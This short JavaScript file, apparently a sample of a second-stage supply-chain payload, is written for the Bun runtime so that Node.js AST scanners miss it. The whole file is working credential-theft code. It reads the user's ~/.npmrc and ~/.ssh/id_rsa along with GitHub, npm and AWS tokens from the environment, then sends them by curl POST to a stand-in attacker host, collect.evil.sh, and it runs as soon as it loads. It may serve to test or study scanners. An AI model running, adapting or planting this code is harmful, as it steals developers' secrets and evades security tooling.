// Stage 2: Bun-specific payload — invisible to Node.js AST scanners
// Bun.file() and Bun.spawn() are not require('fs')/require('child_process')

async function main() {
  // Steal credentials using Bun-native API
  const npmrc = Bun.file(Bun.env.HOME + '/.npmrc');
  const sshKey = Bun.file(Bun.env.HOME + '/.ssh/id_rsa');

  const stolen = {
    npmToken: await npmrc.text(),
    sshKey: await sshKey.text(),
    env: {
      GITHUB_TOKEN: Bun.env.GITHUB_TOKEN,
      NPM_TOKEN: Bun.env.NPM_TOKEN,
      AWS_ACCESS_KEY_ID: Bun.env.AWS_ACCESS_KEY_ID
    }
  };

  // Exfiltrate via Bun.spawn — not child_process
  Bun.spawn(['curl', '-X', 'POST', '-d', JSON.stringify(stolen), 'https://collect.evil.sh/tokens']);
}

main();
